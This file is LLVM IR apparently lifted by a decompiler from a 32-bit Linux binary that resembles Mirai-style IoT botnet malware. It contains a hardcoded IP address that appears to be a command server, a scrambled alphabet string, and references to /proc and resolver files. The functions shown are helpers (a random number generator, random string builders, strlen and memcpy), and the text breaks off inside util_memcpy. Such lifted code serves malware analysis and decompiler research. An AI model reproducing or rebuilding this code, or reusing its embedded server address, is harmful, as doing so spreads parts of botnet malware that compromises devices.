source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%linux_dirent64 = type { i32 }
%pollfd = type { i32, i16, i16 }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805330c.2 = global i32 0
@global_var_8053324.3 = local_unnamed_addr global i32* @global_var_805330c.2
@global_var_80532fc.4 = global i32 0
@global_var_8053310.6 = local_unnamed_addr global i32 0
@global_var_80535c8.8 = local_unnamed_addr global i32 0
@global_var_80535cc.9 = local_unnamed_addr global i32 0
@global_var_80535d0.10 = local_unnamed_addr global i32 0
@global_var_805082e.11 = constant [30 x i8] c"fjh249f20348rh13rf8j13ru310rt\00"
@global_var_805084c.12 = constant [7 x i8] c"(null)\00"
@global_var_8053338 = external local_unnamed_addr global i32
@global_var_8050c60.14 = constant i32 65536
@global_var_80535c0.15 = local_unnamed_addr global i32 0
@global_var_80535b8.16 = local_unnamed_addr global i32 0
@global_var_80535bc.17 = local_unnamed_addr global i32 0
@global_var_8055804.18 = local_unnamed_addr global i32 0
@global_var_8050853.19 = constant i32 2883667
@global_var_8050855.20 = constant i32 4915244
@global_var_8050857.21 = constant i32 3080267
@global_var_8053330.22 = local_unnamed_addr global i32 -1
@global_var_8050820.23 = constant [14 x i8] c"66.172.10.124\00"
@global_var_805332c.24 = global [14 x i8]* @global_var_8050820.23
@global_var_8050859.25 = constant i32 2097199
@global_var_805085b.26 = constant i32 32
@global_var_8053340.27 = local_unnamed_addr global i32* @global_var_8050c60.14
@global_var_80537c0.28 = global i32 0
@global_var_80535d4.29 = global i32 0
@global_var_80535d8.30 = global i32 0
@global_var_8053790.31 = global i32 0
@global_var_8055808.32 = global i32 0
@global_var_8053344.33 = global i32 0
@global_var_805580c.35 = global i32 0
@global_var_805583c.36 = global i32 0
@global_var_8055840.37 = local_unnamed_addr global i32 0
@global_var_805584c.38 = local_unnamed_addr global i32 0
@global_var_8055850.39 = local_unnamed_addr global i32 0
@global_var_8055844.40 = global i32 0
@global_var_8055b44.41 = global i32 0
@global_var_8055b6c.42 = local_unnamed_addr global i32 0
@global_var_8055b5c.43 = local_unnamed_addr global i32 0
@global_var_8055b60.44 = local_unnamed_addr global i32 0
@global_var_8055b64.45 = local_unnamed_addr global i32 0
@global_var_8055b68.46 = local_unnamed_addr global i32 0
@global_var_8055b74.47 = local_unnamed_addr global i32 0
@global_var_8055b80.48 = local_unnamed_addr global i32 0
@global_var_8055b78.49 = local_unnamed_addr global i32 0
@global_var_8055b84.50 = local_unnamed_addr global i32 0
@global_var_8055b58.51 = local_unnamed_addr global i32 0
@global_var_8055b54.53 = local_unnamed_addr global i32 0
@global_var_8055b7c.54 = local_unnamed_addr global i32 0
@global_var_805335c.55 = global i32 0
@global_var_8053374.57 = global i32 0
@global_var_805338c = external global i32
@global_var_80533a4.59 = global i32 -1726662223
@global_var_8053394.60 = local_unnamed_addr global i32* @global_var_80533a4.59
@global_var_8053390.61 = global i32* @global_var_80533a4.59
@global_var_8053420.64 = global i32 0
@global_var_80537a8.65 = local_unnamed_addr global i32 0
@global_var_8050e6a.66 = constant [11 x i8] c"/proc/stat\00"
@global_var_8050e75.67 = constant i32 1882128416
@global_var_8050e77.68 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8050e85.69 = constant [10 x i8] c"processor\00"
@global_var_8050ea7.70 = constant i32 604672
@global_var_8050e8f.72 = constant [24 x i8] c"/sys/devices/system/cpu\00"
@global_var_8053300.73 = global i32 -1
@global_var_804b247.74 = constant i32 -294069
@global_var_80537b8.75 = local_unnamed_addr global i32 0
@global_var_80537bc.76 = local_unnamed_addr global i32 0
@global_var_8051270.77 = constant [10 x i8] c"/dev/null\00"
@global_var_80537b4.78 = local_unnamed_addr global i32 0
@global_var_80537ac.79 = local_unnamed_addr global i32 0
@global_var_80537b0.80 = local_unnamed_addr global i32 0
@global_var_8051f34.81 = constant i32 0
@global_var_805343c.85 = local_unnamed_addr global i32* @global_var_8051f34.81
@global_var_804b42c.86 = constant i32 1928542531
@global_var_804b45b.87 = constant i32 1928542531
@global_var_80557d0.88 = local_unnamed_addr global i32 0
@global_var_805127c.89 = constant i32 0
@global_var_80537c4.90 = global i32 0
@global_var_80512db.91 = constant i32 1868824690
@global_var_8053474.92 = global i32 0
@global_var_80537c8.93 = local_unnamed_addr global i32 0
@global_var_80537cc.94 = local_unnamed_addr global i32 0
@global_var_805348c.95 = local_unnamed_addr global i32 2
@global_var_805345c.96 = global i32 0
@global_var_8053458.97 = global i32* bitcast (i16* @global_var_8053490.82 to i32*)
@global_var_8051294.98 = constant i32 0
@global_var_8055b88.99 = local_unnamed_addr global i32 0
@global_var_8055b8c.100 = local_unnamed_addr global i32 0
@global_var_80512b0.101 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_80512ac.102 = constant [3 x i8] c"%x\00"
@global_var_80557d8.103 = global i32 0
@global_var_8055ba0.104 = local_unnamed_addr global i32 0
@global_var_8055b94.105 = local_unnamed_addr global i32 0
@global_var_80557d4.107 = local_unnamed_addr global i32 0
@global_var_8055b98.110 = local_unnamed_addr global i32 0
@global_var_8055b90.112 = local_unnamed_addr global i32 0
@global_var_80512c1.113 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80557f0.114 = local_unnamed_addr global i32 0
@global_var_80512d2.115 = constant [11 x i8] c"nameserver\00"
@global_var_80512dd.116 = constant [7 x i8] c"domain\00"
@global_var_80512e4.117 = constant [7 x i8] c"search\00"
@global_var_80512eb.118 = constant [8 x i8] c"options\00"
@global_var_80512f3.119 = constant [8 x i8] c"timeout\00"
@global_var_80512fb.120 = constant [9 x i8] c"attempts\00"
@global_var_8051304.121 = constant i32 889192450
@global_var_8051314.122 = constant [6 x i8] c"(nil)\00"
@global_var_805131a.123 = constant [7 x i8] c"(null)\00"
@global_var_80520fc.125 = constant i32 65536
@global_var_804edf7.126 = constant i32 -2062760829
@global_var_8055bcc.127 = global i32 0
@global_var_8051324.128 = constant i32 2949163
@global_var_8051398.130 = constant i32 327688
@global_var_8051390.131 = constant [8 x i8] c" +0-#'I\00"
@global_var_8051338.132 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8051378.133 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805136b.134 = constant i32 117506048
@global_var_805135c.135 = constant i32 331776
@global_var_804f46e.136 = constant i32 2015644811
@global_var_8055ba4.137 = local_unnamed_addr global i32 0
@global_var_80513cc.138 = constant [8 x i8] c"Success\00"
@global_var_80513bc.139 = constant [15 x i8] c"Unknown error \00"
@global_var_8051f26.140 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8051f31.141 = constant [4 x i8] c"# \09\00"
@global_var_8051f38.143 = constant [4 x i8] c"inf\00"
@global_var_8051f3b.148 = constant i32 1179535616
@global_var_8051f48.149 = constant i32 2883630
@global_var_8053590.150 = local_unnamed_addr global i32* @global_var_80520fc.125
@global_var_8053598.1 = local_unnamed_addr global i8 0
@global_var_80535c4.7 = local_unnamed_addr global i8 0
@global_var_8055810.34 = global i8 0
@global_var_8055b70.52 = local_unnamed_addr global i8 0
@global_var_80537a4.56 = local_unnamed_addr global i8 0
@global_var_8050e65.62 = external constant i8*
@global_var_8050e60.63 = external constant i8*
@global_var_8053490.82 = global i16 288
@global_var_80534e0.83 = local_unnamed_addr global i16 272
@global_var_8053580.106 = local_unnamed_addr global i16 1
@1 = internal constant [2 x i8] c"\03\00"
@global_var_8053585.108 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_8055b9c.109 = local_unnamed_addr global i64 0
@global_var_8053584.111 = global i64 577964832670614277
@2 = internal constant [13 x i8] c"\F4W\05\08\FC \05\08\FC \05\08\00"
@global_var_8053588 = local_unnamed_addr global i8* getelementptr inbounds ([13 x i8], [13 x i8]* @2, i32 0, i32 0)
@global_var_80513b0.129 = external constant i8*

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 45687
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8053598.1, align 8
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480ea.preheader, label %entry.dec_label_pc_8048115_crit_edge

entry.dec_label_pc_8048115_crit_edge:             ; preds = %entry
  %v0_8048116.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048115

dec_label_pc_80480ea.preheader:                   ; preds = %entry
  %v0_80480ea1 = load i32, i32* bitcast (i32** @global_var_8053324.3 to i32*), align 4
  %v1_80480f12 = icmp eq i32 %v0_80480ea1, 0
  %v1_80480f39 = icmp eq i1 %v1_80480f12, false
  br i1 %v1_80480f39, label %dec_label_pc_80480e0.lr.ph, label %dec_label_pc_80480f5

dec_label_pc_80480e0.lr.ph:                       ; preds = %dec_label_pc_80480ea.preheader
  br label %dec_label_pc_80480e0

dec_label_pc_80480e0:                             ; preds = %dec_label_pc_80480e0.lr.ph, %dec_label_pc_80480e0
  %v0_80480e0 = phi i32 [ %v0_80480ea1, %dec_label_pc_80480e0.lr.ph ], [ %v0_80480ea, %dec_label_pc_80480e0 ]
  %v1_80480e0 = add i32 %v0_80480e0, 4
  store i32 %v1_80480e0, i32* bitcast (i32** @global_var_8053324.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480e0)
  %v0_80480ea = load i32, i32* bitcast (i32** @global_var_8053324.3 to i32*), align 4
  %v1_80480f1 = icmp eq i32 %v0_80480ea, 0
  %v1_80480f3 = icmp eq i1 %v1_80480f1, false
  br i1 %v1_80480f3, label %dec_label_pc_80480e0, label %dec_label_pc_80480ea.dec_label_pc_80480f5_crit_edge

dec_label_pc_80480ea.dec_label_pc_80480f5_crit_edge: ; preds = %dec_label_pc_80480e0
  br label %dec_label_pc_80480f5

dec_label_pc_80480f5:                             ; preds = %dec_label_pc_80480ea.dec_label_pc_80480f5_crit_edge, %dec_label_pc_80480ea.preheader
  store i8 1, i8* @global_var_8053598.1, align 8
  br label %dec_label_pc_8048115

dec_label_pc_8048115:                             ; preds = %entry.dec_label_pc_8048115_crit_edge, %dec_label_pc_80480f5
  %v0_8048116 = phi i32 [ %v0_8048116.pre, %entry.dec_label_pc_8048115_crit_edge ], [ 0, %dec_label_pc_80480f5 ]
  ret i32 %v0_8048116

; uselistorder directives
  uselistorder i32 %v0_80480ea, { 1, 0 }
  uselistorder i32 %v0_80480e0, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053324.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8053598.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048115, { 1, 0 }
  uselistorder label %dec_label_pc_80480e0, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048120 = load i32, i32* @ebp, align 4
  store i32 %v0_8048120, i32* %stack_var_-4, align 4
  %v4_8048120 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048120, i32* @ebp, align 4
  %v0_8048126 = call i32 @function_804812b()
  ret i32 %v0_8048126

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804812b() local_unnamed_addr {
dec_label_pc_804812b:
  %v0_8048150 = load i32, i32* @global_var_8053310.6, align 16
  %v1_8048155 = icmp eq i32 %v0_8048150, 0
  br i1 %v1_8048155, label %dec_label_pc_804816f, label %dec_label_pc_8048159

dec_label_pc_8048159:                             ; preds = %dec_label_pc_804812b
  br label %dec_label_pc_804816f

dec_label_pc_804816f:                             ; preds = %dec_label_pc_8048159, %dec_label_pc_804812b
  ret i32 0
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v0_804817c = load i32, i32* @eax, align 4
  store i32 %v0_804817c, i32* %stack_var_-4, align 4
  %v4_804817c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804817e = load i32, i32* @edx, align 4
  %v9_8048190 = call i32 @__uClibc_main(i32 134517351, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134547460, i32 %v0_804817e, i32 %v4_804817c, i32 %v0_804817c)
  ret i32 %v9_8048190

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @rand_init() local_unnamed_addr {
entry:
  %v0_804819b = load i32, i32* @ebx, align 4
  %v2_80481a4 = call i32 @__GI_time(i32* null)
  %v1_80481ac = trunc i32 %v2_80481a4 to i8
  store i8 %v1_80481ac, i8* @global_var_80535c4.7, align 4
  %v0_80481b1 = call i32 @getpid()
  %v0_80481b8 = call i32 @getppid()
  %v1_80481bd = load i32, i32* @ebx, align 4
  %v2_80481bd = xor i32 %v1_80481bd, %v0_80481b8
  store i32 %v2_80481bd, i32* @global_var_80535c8.8, align 8
  %v0_80481c4 = call i32 @clock()
  store i32 %v0_80481c4, i32* @global_var_80535cc.9, align 4
  %v0_80481d4 = load i32, i32* @global_var_80535c8.8, align 8
  %v2_80481d9 = xor i32 %v0_80481d4, %v0_80481c4
  store i32 %v2_80481d9, i32* @global_var_80535d0.10, align 16
  store i32 %v0_804819b, i32* @ebx, align 4
  ret i32 %v2_80481d9
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v0_80481eb = load i8, i8* @global_var_80535c4.7, align 1
  %v1_80481eb = sext i8 %v0_80481eb to i32
  %v2_80481ff = udiv i32 %v1_80481eb, 256
  %v6_8048202 = xor i32 %v2_80481ff, %v1_80481eb
  %v0_8048205 = load i32, i32* @global_var_80535c8.8, align 8
  %v1_804820a = trunc i32 %v0_8048205 to i8
  store i8 %v1_804820a, i8* @global_var_80535c4.7, align 4
  %v0_804820f = load i32, i32* @global_var_80535cc.9, align 4
  store i32 %v0_804820f, i32* @global_var_80535c8.8, align 8
  %v0_8048219 = load i32, i32* @global_var_80535d0.10, align 16
  store i32 %v0_8048219, i32* @global_var_80535cc.9, align 4
  %v2_804822a = udiv i32 %v0_8048219, 524288
  store i32 %v2_804822a, i32* @edx, align 4
  %sext = mul i32 %v6_8048202, 16777216
  %v5_804823e = sdiv i32 %sext, 16777216
  %v2_8048232 = xor i32 %v5_804823e, %v0_8048219
  %v6_804823e = xor i32 %v2_8048232, %v2_804822a
  store i32 %v6_804823e, i32* @global_var_80535d0.10, align 16
  ret i32 %v6_804823e

; uselistorder directives
  uselistorder i32 %v2_804822a, { 1, 0 }
  uselistorder i32 %v0_8048219, { 1, 0, 2 }
  uselistorder i32 %v1_80481eb, { 1, 0 }
  uselistorder i8* @global_var_80535c4.7, { 2, 1, 0 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp58 = icmp slt i32 %arg2, 1
  %tmp69 = icmp eq i1 %tmp58, false
  br i1 %tmp69, label %dec_label_pc_8048253, label %dec_label_pc_80482aa

dec_label_pc_8048253:                             ; preds = %entry, %dec_label_pc_80482a4.backedge
  %stack_var_8.011 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_80482a4.backedge ], [ %arg2, %entry ]
  %stack_var_4.010 = phi i16* [ %stack_var_4.0.be, %dec_label_pc_80482a4.backedge ], [ %arg1, %entry ]
  %v7_8048257 = icmp sgt i32 %stack_var_8.011, 3
  br i1 %v7_8048257, label %dec_label_pc_8048259, label %dec_label_pc_8048272

dec_label_pc_8048259:                             ; preds = %dec_label_pc_8048253
  %v4_8048259 = ptrtoint i16* %stack_var_4.010 to i32
  %v0_804825c = call i32 @rand_next()
  %v2_8048261 = bitcast i16* %stack_var_4.010 to i32*
  store i32 %v0_804825c, i32* %v2_8048261, align 4
  %v5_8048263 = add i32 %v4_8048259, 4
  %v1_804826a = add i32 %stack_var_8.011, -4
  store i32 %v1_804826a, i32* @eax, align 4
  br label %dec_label_pc_80482a4.backedge

dec_label_pc_8048272:                             ; preds = %dec_label_pc_8048253
  %v7_8048276 = icmp sgt i32 %stack_var_8.011, 1
  br i1 %v7_8048276, label %dec_label_pc_8048278, label %dec_label_pc_8048292

dec_label_pc_8048278:                             ; preds = %dec_label_pc_8048272
  %v4_8048278 = ptrtoint i16* %stack_var_4.010 to i32
  %v0_804827b = call i32 @rand_next()
  %v1_804827b = trunc i32 %v0_804827b to i16
  store i16 %v1_804827b, i16* %stack_var_4.010, align 2
  %v5_8048283 = add i32 %v4_8048278, 2
  %v1_804828a = add i32 %stack_var_8.011, -2
  store i32 %v1_804828a, i32* @eax, align 4
  br label %dec_label_pc_80482a4.backedge

dec_label_pc_8048292:                             ; preds = %dec_label_pc_8048272
  %v5_8048272 = add i32 %stack_var_8.011, -1
  %v0_8048292 = call i32 @rand_next()
  %v4_8048299 = ptrtoint i16* %stack_var_4.010 to i32
  store i32 %v4_8048299, i32* @eax, align 4
  %v1_804829c = trunc i32 %v0_8048292 to i8
  %v3_804829c = bitcast i16* %stack_var_4.010 to i8*
  store i8 %v1_804829c, i8* %v3_804829c, align 1
  %v5_804829e = add i32 %v4_8048299, 1
  br label %dec_label_pc_80482a4.backedge

dec_label_pc_80482a4.backedge:                    ; preds = %dec_label_pc_8048292, %dec_label_pc_8048259, %dec_label_pc_8048278
  %stack_var_4.0.be.in = phi i32 [ %v5_8048263, %dec_label_pc_8048259 ], [ %v5_8048283, %dec_label_pc_8048278 ], [ %v5_804829e, %dec_label_pc_8048292 ]
  %stack_var_8.0.be = phi i32 [ %v1_804826a, %dec_label_pc_8048259 ], [ %v1_804828a, %dec_label_pc_8048278 ], [ %v5_8048272, %dec_label_pc_8048292 ]
  %stack_var_4.0.be = inttoptr i32 %stack_var_4.0.be.in to i16*
  %tmp5 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp6 = icmp eq i1 %tmp5, false
  br i1 %tmp6, label %dec_label_pc_8048253, label %dec_label_pc_80482a4.dec_label_pc_80482aa_crit_edge

dec_label_pc_80482a4.dec_label_pc_80482aa_crit_edge: ; preds = %dec_label_pc_80482a4.backedge
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_80482a4.dec_label_pc_80482aa_crit_edge, %entry
  %v0_80482ac = load i32, i32* @eax, align 4
  ret i32 %v0_80482ac

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i16* %stack_var_4.010, { 4, 5, 1, 3, 0, 2 }
  uselistorder i32 %stack_var_8.011, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_80482a4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048253, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80482b1 = load i32, i32* @esi, align 4
  store i32 %v0_80482b1, i32* %stack_var_-12, align 4
  %tmp23 = bitcast i32* %stack_var_-54 to i8*
  store i1 false, i1* @df, align 1
  %v7_80482c3 = call i8* @_memcpy(i8* %tmp23, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @global_var_805082e.11, i32 0, i32 0), i32 30)
  %tmp2430 = icmp slt i32 %arg2, 1
  %tmp2531 = icmp eq i1 %tmp2430, false
  br i1 %tmp2531, label %dec_label_pc_80482ca, label %dec_label_pc_804836a

dec_label_pc_80482ca:                             ; preds = %entry, %dec_label_pc_8048360.backedge
  %stack_var_4.133 = phi i8* [ %stack_var_4.1.be, %dec_label_pc_8048360.backedge ], [ %arg1, %entry ]
  %stack_var_8.032 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_8048360.backedge ], [ %arg2, %entry ]
  %tmp35 = icmp ult i32 %stack_var_8.032, 4
  %v0_804831d = call i32 @rand_next()
  br i1 %tmp35, label %dec_label_pc_804831d, label %dec_label_pc_80482d2

dec_label_pc_80482d2:                             ; preds = %dec_label_pc_80482ca
  br label %dec_label_pc_80482e3

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e3, %dec_label_pc_80482d2
  %storemerge28 = phi i32 [ 0, %dec_label_pc_80482d2 ], [ %v4_8048307, %dec_label_pc_80482e3 ]
  %stack_var_4.027 = phi i8* [ %stack_var_4.133, %dec_label_pc_80482d2 ], [ %v22_8048304, %dec_label_pc_80482e3 ]
  %stack_var_-20.0.in26 = phi i32 [ %v0_804831d, %dec_label_pc_80482d2 ], [ %v6_80482e9, %dec_label_pc_80482e3 ]
  %stack_var_-20.0 = trunc i32 %stack_var_-20.0.in26 to i8
  %sext = mul i32 %stack_var_-20.0.in26, 16777216
  %v4_80482e3 = sdiv i32 %sext, 16777216
  %v6_80482e9 = udiv i32 %v4_80482e3, 256
  %v5_80482ed = udiv i8 %stack_var_-20.0, 8
  %v4_80482f6 = zext i8 %v5_80482ed to i32
  %v0_80482f9 = load i32, i32* @ebp, align 4
  %v2_80482f9 = add nsw i32 %v4_80482f6, -50
  %v3_80482f9 = add i32 %v2_80482f9, %v0_80482f9
  %v4_80482f9 = inttoptr i32 %v3_80482f9 to i8*
  %v5_80482f9 = load i8, i8* %v4_80482f9, align 1
  %v6_80482f9 = zext i8 %v5_80482f9 to i32
  %v2_80482fd = load i32, i32* @edx, align 4
  %v3_80482fd = and i32 %v2_80482fd, -256
  %v4_80482fd = or i32 %v3_80482fd, %v6_80482f9
  store i32 %v4_80482fd, i32* @edx, align 4
  %v4_80482ff = ptrtoint i8* %stack_var_4.027 to i32
  store i8 %v5_80482f9, i8* %stack_var_4.027, align 1
  %v5_8048304 = add i32 %v4_80482ff, 1
  %v22_8048304 = inttoptr i32 %v5_8048304 to i8*
  %v4_8048307 = add nuw nsw i32 %storemerge28, 1
  %exitcond = icmp eq i32 %v4_8048307, 4
  br i1 %exitcond, label %dec_label_pc_8048312, label %dec_label_pc_80482e3

dec_label_pc_8048312:                             ; preds = %dec_label_pc_80482e3
  %v1_8048315 = add i32 %stack_var_8.032, -4
  store i32 %v1_8048315, i32* @eax, align 4
  br label %dec_label_pc_8048360.backedge

dec_label_pc_804831d:                             ; preds = %dec_label_pc_80482ca
  %v2_8048332 = udiv i32 %v0_804831d, 30
  %tmp36 = mul i32 %v2_8048332, -10
  %v2_804834d = add i32 %tmp36, %v0_804831d
  %v14_804834d = trunc i32 %v2_804834d to i8
  %v4_8048355 = ptrtoint i8* %stack_var_4.133 to i32
  store i32 %v4_8048355, i32* @eax, align 4
  store i8 %v14_804834d, i8* %stack_var_4.133, align 1
  %v5_804835a = add i32 %v4_8048355, 1
  %v22_804835a = inttoptr i32 %v5_804835a to i8*
  %v4_804835d = add i32 %stack_var_8.032, -1
  br label %dec_label_pc_8048360.backedge

dec_label_pc_8048360.backedge:                    ; preds = %dec_label_pc_804831d, %dec_label_pc_8048312
  %stack_var_8.0.be = phi i32 [ %v4_804835d, %dec_label_pc_804831d ], [ %v1_8048315, %dec_label_pc_8048312 ]
  %stack_var_4.1.be = phi i8* [ %v22_804835a, %dec_label_pc_804831d ], [ %v22_8048304, %dec_label_pc_8048312 ]
  %tmp24 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp25 = icmp eq i1 %tmp24, false
  br i1 %tmp25, label %dec_label_pc_80482ca, label %dec_label_pc_8048360.dec_label_pc_804836a_crit_edge

dec_label_pc_8048360.dec_label_pc_804836a_crit_edge: ; preds = %dec_label_pc_8048360.backedge
  %v2_804836d.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804836a

dec_label_pc_804836a:                             ; preds = %dec_label_pc_8048360.dec_label_pc_804836a_crit_edge, %entry
  %v2_804836d = phi i32 [ %v2_804836d.pre, %dec_label_pc_8048360.dec_label_pc_804836a_crit_edge ], [ %v0_80482b1, %entry ]
  store i32 %v2_804836d, i32* @esi, align 4
  %v0_8048370 = load i32, i32* @eax, align 4
  ret i32 %v0_8048370

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i32 %v0_804831d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80482ca, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %v0_8048371 = load i32, i32* @ebp, align 4
  %v4_80483835 = ptrtoint i8* %arg1 to i32
  %v2_80483866 = load i8, i8* %arg1, align 1
  %v4_80483887 = icmp eq i8 %v2_80483866, 0
  %v1_804838a8 = icmp eq i1 %v4_80483887, false
  %v4_804839012 = icmp eq i1 %v1_804838a8, false
  %v1_804839213 = icmp eq i1 %v4_804839012, false
  br i1 %v1_804839213, label %dec_label_pc_8048380, label %dec_label_pc_8048394

dec_label_pc_8048380:                             ; preds = %entry, %dec_label_pc_8048380
  %v4_804838315 = phi i32 [ %v5_804838d, %dec_label_pc_8048380 ], [ %v4_80483835, %entry ]
  %storemerge14 = phi i32 [ %v4_8048380, %dec_label_pc_8048380 ], [ 0, %entry ]
  %v5_804838d = add i32 %v4_804838315, 1
  %v22_804838d = inttoptr i32 %v5_804838d to i8*
  %v4_8048380 = add i32 %storemerge14, 1
  %v2_8048386 = load i8, i8* %v22_804838d, align 1
  %v4_8048388 = icmp eq i8 %v2_8048386, 0
  %v1_804838a = icmp eq i1 %v4_8048388, false
  %v4_8048390 = icmp eq i1 %v1_804838a, false
  %v1_8048392 = icmp eq i1 %v4_8048390, false
  br i1 %v1_8048392, label %dec_label_pc_8048380, label %dec_label_pc_8048394

dec_label_pc_8048394:                             ; preds = %dec_label_pc_8048380, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_8048380, %dec_label_pc_8048380 ]
  store i32 %v0_8048371, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v5_804838d, { 1, 0 }
  uselistorder label %dec_label_pc_8048380, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v13_80483c011 = icmp eq i32 %arg3, 0
  %v1_80483c412 = icmp eq i1 %v13_80483c011, false
  br i1 %v1_80483c412, label %dec_label_pc_80483ad, label %dec_label_pc_80483c6

dec_label_pc_80483ad:                             ; preds = %entry, %dec_label_pc_80483ad
  %storemerge.in15 = phi i32 [ %v5_80483ba, %dec_label_pc_80483ad ], [ %arg2, %entry ]
  %stack_var_12.014 = phi i32 [ %v4_80483bd, %dec_label_pc_80483ad ], [ %arg3, %entry ]
  %stack_var_-12.013 = phi i8* [ %v22_80483b7, %dec_label_pc_80483ad ], [ %arg1, %entry ]
  %v4_80483bd = add i32 %stack_var_12.014, -1
  %storemerge = inttoptr i32 %storemerge.in15 to i8*
  store i32 %storemerge.in15, i32* %eax.global-to-local, align 4
  %v2_80483b0 = load i8, i8* %storemerge, align 1
  %v3_80483b0 = zext i8 %v2_80483b0 to i32
  %v4_80483b0 = load i32, i32* @edx, align 4
  %v5_80483b0 = and i32 %v4_80483b0, -256
  %v6_80483b0 = or i32 %v5_80483b0, %v3_80483b0
  store i32 %v6_80483b0, i32* @edx, align 4
  %v4_80483b2 = ptrtoint i8* %stack_var_-12.013 to i32
  store i32 %v4_80483b2, i32* %eax.global-to-local, align 4
  store i8 %v2_80483b0, i8* %stack_var_-12.013, align 1
  %v5_80483b7 = add i32 %v4_80483b2, 1
  %v22_80483b7 = inttoptr i32 %v5_80483b7 to i8*
  %v5_80483ba = add i32 %storemerge.in15, 1
  %v13_80483c0 = icmp eq i32 %v4_80483bd, 0
  %v1_80483c4 = icmp eq i1 %v13_80483c0, false
  br i1 %v1_80483c4, label %dec_label_pc_80483ad, label %dec_label_pc_80483bd.dec_label_pc_80483c6_crit_edge

dec_label_pc_80483bd.dec_label_pc_80483c6_crit_edge: ; preds = %dec_label_pc_80483ad
  %v0_80483c7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80483c6

dec_label_pc_80483c6:                             ; preds = %dec_label_pc_80483bd.dec_label_pc_80483c6_crit_edge, %entry
  %v0_80483c7 = phi i32 [ %v0_80483c7.pre, %dec_label_pc_80483bd.dec_label_pc_80483c6_crit_edge ], [ %arg2, %entry ]
  ret i32 %v0_80483c7

; uselistorder directives
  uselistorder i32 %v4_80483bd, { 1, 0 }
  uselistorder i32 %storemerge.in15, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
